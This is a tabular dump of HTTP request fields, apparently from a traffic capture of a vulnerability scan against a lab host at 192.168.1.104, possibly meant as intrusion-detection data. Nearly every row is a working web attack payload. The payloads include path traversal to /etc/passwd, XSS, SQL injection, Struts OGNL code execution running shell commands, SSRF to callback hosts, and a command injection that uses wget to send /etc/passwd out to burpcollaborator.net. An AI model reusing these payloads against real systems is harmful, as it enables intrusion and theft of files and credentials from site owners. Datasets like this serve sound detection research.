http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/admin/data/autosuggest-remote.php?q="><img%20src=x%20onerror=alert(1)>		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/admin/data/autosuggest-remote.php?q="><img%20src=x%20onerror=alert(1)>
*/*	gzip	en															close		8004	8004	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=../../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=../../../../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5(8888)),1)		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5(8888)),1)
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_vjdeo&controller=../../../../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/index.php?option=com_vjdeo&controller=../../../../../../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/login?next=\\\example.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/login?next=\\\example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd
	gzip																close		45	45							192.168.1.104														http://192.168.1.104/web/webadmin/start/	1	http://192.168.1.104/web/webadmin/auth/verification.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/webadmin/auth/verification.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/Assets/temp/hotspot/img/logohotspot.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/Assets/temp/hotspot/img/logohotspot.txt
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_redshop&view=../../../../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/index.php?option=com_redshop&view=../../../../../../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%2725Sm0P31pYRyYWxZzEoXDL2NItg%27)>		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%2725Sm0P31pYRyYWxZzEoXDL2NItg%27)>
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://burpcollaborator.net		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://burpcollaborator.net
*/*	gzip	en															close				application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cms/info.php?mod=list%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/cms/info.php?mod=list%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://c8accf99m8v8l7afta3gcekccoeyyyyyq.oast.site		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://c8accf99m8v8l7afta3gcekccoeyyyyyq.oast.site
application/json, text/plain, */*	gzip																close		60	60	application/json						192.168.1.104														http://192.168.1.104/web/artifactory/webapp/	1	http://192.168.1.104/web/artifactory/ui/auth/login?_spring_security_remember_me=false		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36		127.0.0.1		/web/artifactory/ui/auth/login?_spring_security_remember_me=false
	gzip																close		69	69	application/json						192.168.1.104															1	http://192.168.1.104/web/redfish/v1/SessionService/Sessions/		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/redfish/v1/SessionService/Sessions/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/costModule/faces/javax.faces.resource/web.xml?loc=../WEB-INF		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/costModule/faces/javax.faces.resource/web.xml?loc=../WEB-INF
	gzip																close		66	66	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/dfsms/		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/dfsms/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_market&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/index.php?option=com_market&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
	gzip																close		1023	1023	multipart/form-data; boundary=25Sm0ET027hot6ax3QDGBhy9Ide						192.168.1.104															1	http://192.168.1.104/web/XMLCHART		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/XMLCHART
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/components/com_moofaq/includes/file_includer.php?gzip=0&file=/../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/components/com_moofaq/includes/file_includer.php?gzip=0&file=/../../../../../etc/passwd
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(document.domain)+xx=%22test&from_url=x		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(document.domain)+xx=%22test&from_url=x
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_jwhmcs&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/index.php?option=com_jwhmcs&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/system/deviceInfo?auth=YWRtaW46MTEK		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/system/deviceInfo?auth=YWRtaW46MTEK
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php?action=0158228b8100449b0d3152687f07370b		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/wp-admin/admin-ajax.php?action=0158228b8100449b0d3152687f07370b
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_jinventory&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/index.php?option=com_jinventory&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?page_slug=../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/index.php?page_slug=../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/lib/dompdf/dompdf.php?input_file=dompdf.php		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/lib/dompdf/dompdf.php?input_file=dompdf.php
application/json	gzip																close		278	278	application/json						192.168.1.104															1	http://192.168.1.104/web/_ignition/execute-solution		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/_ignition/execute-solution
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/admin/data/autosuggest-remote.php?q="><img%20src=x%20onerror=alert(1)>		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/admin/data/autosuggest-remote.php?q="><img%20src=x%20onerror=alert(1)>
*/*	gzip	en															close		8004	8004	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/costModule/faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/costModule/faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..
	gzip																close		154	154	application/json						192.168.1.104															1	http://192.168.1.104/web/run		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/run
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=../../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=../../../../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wpdmpro/list-packages/?orderby=title%22%3E%3Cscript%3Ealert(1)%3C/script%3E&order=asc		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/wpdmpro/list-packages/?orderby=title%22%3E%3Cscript%3Ealert(1)%3C/script%3E&order=asc
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/__r2/query-printRows.view?schemaName=ListManager&query.queryName=ListManager&query.sort=Nameelk5q%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ezp59r&query.containerFilterName=CurrentAndSubfolders&query.selectionKey=%24ListManager%24ListManager%24%24query&query.showRows=ALL		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/__r2/query-printRows.view?schemaName=ListManager&query.queryName=ListManager&query.sort=Nameelk5q%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ezp59r&query.containerFilterName=CurrentAndSubfolders&query.selectionKey=%24ListManager%24ListManager%24%24query&query.showRows=ALL
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*	gzip																close				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hacker','Bounty Plz')}.multipart/form-data						192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/api/getServices?name[]=$(wget%20--post-file%20/etc/passwd%20burpcollaborator.net)		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/api/getServices?name[]=$(wget%20--post-file%20/etc/passwd%20burpcollaborator.net)
	gzip																close										192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/appGet.cgi?hook=get_cfg_clientlist()		GET				HTTP/1.1																			asusrouter--			asus_token=\0Invalid; clickedItem_tab=0	/web/appGet.cgi?hook=get_cfg_clientlist()
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/event-espresso-core-reg/admin_pages/messages/templates/ee_msg_admin_overview.template.php?page=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cb		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/wp-content/plugins/event-espresso-core-reg/admin_pages/messages/templates/ee_msg_admin_overview.template.php?page=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cb
	gzip																close		7422	7422	text/xml; charset=utf-8						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/version.web		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/version.web
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%2725Sm0P31pYRyYWxZzEoXDL2NItg%27)>		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%2725Sm0P31pYRyYWxZzEoXDL2NItg%27)>
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/includes/dompdf/dompdf.php?input_file=dompdf.php		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/includes/dompdf/dompdf.php?input_file=dompdf.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/..		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/..
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_onlineexam&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/index.php?option=com_onlineexam&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_kif_nexus&controller=../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/index.php?option=com_kif_nexus&controller=../../../../../../../../../etc/passwd
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.	gzip																close		151	151	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/jolokia/read/getDiagnosticOptions		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/jolokia/read/getDiagnosticOptions
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/r2w/signIn.do?urll=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/r2w/signIn.do?urll=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/contact-form-7/readme.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/wp-content/plugins/contact-form-7/readme.txt
	gzip																close		66	66	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/dfsms/		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/dfsms/
	gzip																close		69	69	application/json						192.168.1.104															1	http://192.168.1.104/web/redfish/v1/SessionService/Sessions/		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/redfish/v1/SessionService/Sessions/
application/json, text/plain, */*	gzip																close		60	60	application/json						192.168.1.104														http://192.168.1.104/web/artifactory/webapp/	1	http://192.168.1.104/web/artifactory/ui/auth/login?_spring_security_remember_me=false		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36		127.0.0.1		/web/artifactory/ui/auth/login?_spring_security_remember_me=false
application/json	gzip																close		183	183	application/json						192.168.1.104															1	http://192.168.1.104/web/_ignition/execute-solution		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/_ignition/execute-solution
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}
	gzip																close		1023	1023	multipart/form-data; boundary=25Sm0ET027hot6ax3QDGBhy9Ide						192.168.1.104															1	http://192.168.1.104/web/XMLCHART		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/XMLCHART
